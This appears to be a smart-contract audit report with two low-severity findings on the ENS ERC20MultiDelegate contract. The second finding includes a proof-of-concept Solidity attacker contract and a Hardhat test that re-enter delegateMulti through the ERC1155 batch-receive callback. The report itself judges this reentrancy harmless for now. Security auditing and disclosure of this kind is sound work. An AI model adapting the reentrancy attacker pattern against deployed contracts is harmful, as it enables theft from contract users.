# [L-01] check the ProxyAddress return

**Impact:**
The function `deployProxyDelegatorIfNeeded` calculates the `proxyAddress` from `retrieveProxyContractAddress` function to check if there's a contract deployed at this address. If not, it calls the `create2` (new) function to create this proxy. This can lead to issues if `retrieveProxyContractAddress` doesn't return properly.

## Recommendations
Add a return to [new function](https://github.com/code-423n4/2023-10-ens/blob/ed47c841a19abd26681110a26ef03c446da2b6dd/contracts/ERC20MultiDelegate.sol#L186) and check if `proxyAddress` is equal the return.

# [L-02] function delegateMulti can have reentrancy

**Impact:**
Reentrancy can occur on the `_mintBatch()` call. However, this doesn't impact the contract because it adheres to the Checks-Effects-Interactions pattern. The `_mintBatch()` function calls the receiver if it's a contract at this location: [_doSafeBatchTransferAcceptanceCheck](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC1155/ERC1155.sol#L413). This call can lead to reentrancy, which isn't problematic *right now*.

## POC
Create the attacker contract

```solidity
file: src/contracts/Attacker.sol
// contracts/Attacker.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "../contracts/ERC20MultiDelegate.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";

contract Attacker is ERC1155Holder {

    uint256[] optSources;
    uint256[] optTargets;
    uint256[] optAmounts;
    address contractDelegate;
    bool called;
    function approveToken(ERC20Votes _token, address _contractAddr) external {
        _token.approve(_contractAddr, type(uint256).max);
    }
    function delegateMulti(
        address contractAddr,
        uint256[] calldata sources,
        uint256[] calldata targets,
        uint256[] calldata amounts
    ) external {
        optSources = sources;
        optTargets = targets;
        optAmounts = amounts;
        contractDelegate = contractAddr;
        ERC20MultiDelegate(contractAddr).delegateMulti(sources, targets, amounts);
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public virtual override returns (bytes4) {
        if (!called) {
            called = true;
            ERC20MultiDelegate(contractDelegate).delegateMulti(optSources, optTargets, optAmounts);
        }
        return this.onERC1155BatchReceived.selector;
    }
}
```

Change the test file:
```js 
file: test/delegatemulti.js
    it('test contract receiving ERC1155', async () => {
      console.log("entrou!");
      const Attacker = await ethers.getContractFactory(
        'Attacker'
      );
      attacker = await Attacker.deploy();
      await attacker.deployed();
      console.log("saiu!");
      await increaseTime(365 * 24 * 60 * 60);
      const mintAmount = (await token.totalSupply()).div(50);
      await token.mint(attacker.address, mintAmount);
      const attackerTokenAmount = await token.balanceOf(attacker.address);
      console.log("attackerTokenAmount        ", await attackerTokenAmount.toString());
  
      // give allowance to multi delegate contract
      await attacker.approveToken(token.address, multiDelegate.address);

      // delegate multiple delegates
      const delegates = [deployer, alice, bob, charlie];
      const amounts = delegates.map(() =>
      //divide by 2 to call twice inside attacker contract
      attackerTokenAmount.div(2).div(delegates.length)
      );
      
      await attacker.delegateMulti(multiDelegate.address, [], delegates, amounts);
    });
```
## Recommendations
Consider the following two options:

1. Nothing to do right now, but remain aware of this potential reentrancy. Always follow up on OpenZeppelin updates and monitor any changes when updating the version and deploying a new version, as well as any modifications to the EVM.
2. Integrate the `ReentrancyGuard` from OpenZeppelin to permanently mitigate the reentrancy vulnerability.